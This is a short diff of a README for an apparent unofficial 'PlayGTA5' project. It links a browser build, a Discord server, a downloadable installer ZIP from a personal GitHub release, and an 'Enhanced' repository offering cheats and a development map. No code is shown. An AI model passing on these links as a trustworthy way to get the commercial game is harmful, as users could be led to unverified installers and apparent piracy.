@@ -4,7 +4,7 @@ DISCORD SERVER!!
 https://discord.gg/ACgUGFwm4
 
 [**Play in browser / device check**]
-https://solve5.playgta5.net https://gta5-87g.pages.dev/?low=1&fps=30&res=1280x720&shadows=0 
+https://solve5.playgta5.net https://gta5-87g.pages.dev/?low=1&fps=30&res=1280x720&shadows=0 https://gta5-87g.pages.dev/
 (https://gta5-87g.pages.dev/__support/) · [**Download installer ZIP**](https://github.com/alihammoud21/playgta5/releases/download/full-game-v1/PlayGTA5-Installer-v2.zip) · [Installation](#download-and-play-on-windows) · [Mac](#download-and-play-on-mac) · [Higher-FPS setup](#performance--higher-fps) · [Report a problem](https://github.com/alihammoud21/playgta5/issues/new/choose)
 
 **Want controllers, cheats, and the experimental development map?** Use the separate [**PlayGTA5 Enhanced** repository](https://github.com/alihammoud21/playgta5-enhanced). It reuses this installation and adds a launcher, standard-gamepad input bridge, cheat-code entry panel, and access to the existing `env_test` level. These are experimental additions.
